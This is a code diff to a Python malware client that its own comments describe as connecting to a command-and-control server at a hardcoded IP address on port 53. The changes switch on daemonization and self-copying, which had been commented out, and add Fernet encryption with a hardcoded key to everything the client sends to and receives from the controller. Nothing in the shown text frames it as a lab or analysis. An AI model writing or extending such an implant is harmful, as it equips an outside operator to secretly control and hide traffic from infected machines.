@@ -7,7 +7,7 @@ import socket
 import subprocess
 import stat
 import time
-
+from cryptography.fernet import Fernet
 
 
 class client:
@@ -15,6 +15,7 @@ class client:
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
     host = '18.205.103.236'
+
     # port of the server to connect to, can be changed depending on what port server is listening at
     port = 53
 
@@ -22,15 +23,18 @@ class client:
 
     SEPARATOR = "<SEPARATOR>"
 
+    #generated before-hand with Fernet
+    key ='YbBugTC9pGKLMdak53p6lmy7OVp3E5qegMkMq4iPxU4='
+
     def __init__(self):
         # deamonize the process
-        # self.daemonize()
+        self.daemonize()
 
         # acquire process lock so only one instance of the daemon can exist at a time
         self.get_lock()
 
         # copy the file content
-        # self.copy_client()
+        self.copy_client()
 
         self.connect()
 
@@ -212,12 +216,16 @@ class client:
 
     # send the msg to the server. msg is in bytes
     def client_send(self, msg):
-        self.sock_to_server.send(msg)
+        f = Fernet(client.key)
+        encrypted = f.encrypt(msg)
+        self.sock_to_server.send(encrypted)
 
     # receive message from the server, the returned message is in bytes
     def client_recv(self):
-        return self.sock_to_server.recv(client.BUFFER_SIZE)
-
+        f = Fernet(client.key)
+        message = self.sock_to_server.recv(client.BUFFER_SIZE)
+        decyrpted = f.decrypt(message)
+        return decyrpted
 
 if __name__ == '__main__':
     client()
